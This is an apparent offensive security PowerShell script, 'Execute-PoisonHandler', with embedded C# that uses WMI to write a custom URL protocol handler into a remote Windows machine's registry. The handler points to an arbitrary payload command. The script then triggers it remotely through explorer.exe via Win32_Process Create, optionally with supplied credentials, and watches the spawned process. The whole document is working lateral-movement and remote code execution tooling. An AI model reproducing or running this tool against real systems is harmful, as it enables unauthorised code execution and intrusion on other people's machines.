$CSharp = 'using System;using System.Management;namespace RegistryEdit {public class Program {public static void Main(string[]args) {ConnectionOptions co=new ConnectionOptions();co.Username=args[0];co.Password=args[1];string target=args[2];string handler=args[3];string command=args[4];ManagementScope ms=new ManagementScope("\\\\"+target+"\\root\\default");if(!args[0].Equals("")){ms.Options=co;}ManagementClass mc=new ManagementClass(ms,new ManagementPath("StdRegProv"),null);ManagementBaseObject mbo=mc.GetMethodParameters("SetStringValue");mbo["hDefKey"]=2147483649;mbo["sSubKeyName"]="Software\\Classes\\"+handler;mbo["sValue"]="URL: "+handler;mbo["sValueName"]="URL Protocol";mc.InvokeMethod("CreateKey",mbo,null);mc.InvokeMethod("SetStringValue",mbo,null);mc.GetMethodParameters("SetStringValue");mbo["sSubKeyName"]="Software\\Classes\\"+handler+"\\shell\\open\\command";mbo["sValue"]=command;mbo["sValueName"]=null;mc.InvokeMethod("CreateKey",mbo,null);mc.InvokeMethod("SetStringValue",mbo,null);}}}';

Add-Type -ReferencedAssemblies "System.Management.dll" -TypeDefinition $CSharp -Language CSharp;

function Execute-PoisonHandler {	
	param(
		[Parameter(Mandatory=$True)]
		[string]$Payload,
		[Parameter(Mandatory=$True)]
		[string]$ComputerName,
		[Parameter(Mandatory=$False)]
		[string]$Username = "",
		[Parameter(Mandatory=$False)]
		[string]$Password = "",
		[Parameter(Mandatory=$False)]
		[string]$Handler = "ms-browser"
	)
	
	BEGIN {
		Write-Host "[+] Executing payload on $($ComputerName)"
		if($Username -ne "") {
			$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
			$Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
		}
		$Command = "explorer.exe $($Handler)://"
	}
	
	PROCESS {
		[RegistryEdit.Program]::Main(@($Username, $Password, $ComputerName, $Handler, $Payload));
	
		Write-Output "[+] Remotely invoking the protocol handler using: $($Command)"
		if($Creds) {
			Write-Output "[*] Remotely authenticated as $($Username)"
			$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $Command -Impersonation 3 -EnableAllPrivileges -Credential $Creds
			Try {
				Write-Output "[+] Remote Process PID: $($process.ProcessId)"
				Register-WmiEvent -ComputerName $ComputerName -Query "Select * from Win32_ProcessStopTrace Where ProcessID=$($process.ProcessId)" -Credential $Creds -Action {
					$state = $event.SourceEventArgs.NewEvent;
					Write-Output "[+] Remote process status:`nPID: $($state.ProcessId)`nState: $($state.State)`nStatus: $($state.Status)" 
				}
			} Catch {
				$_
				Write-Output "[-] Process Status couldn't be retrieved"
			}
		} else {
			$process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $Command
			Try {
				Write-Output "[+] Remote Process PID: $($process.ProcessId)"
				Register-WmiEvent -ComputerName $ComputerName -Query "Select * from Win32_ProcessStopTrace Where ProcessID=$($process.ProcessId)" -Action {
					$state = $event.SourceEventArgs.NewEvent;
					Write-Output "[+] Remote process status:`nPID: $($state.ProcessId)`nState: $($state.State)`nStatus: $($state.Status)" 
				}
			} Catch {
				$_
				Write-Output "[-] Process Status couldn't be retrieved"
			}
		}
	}
	
	END {
		Write-Host "[+] Process completed..."
	}
}
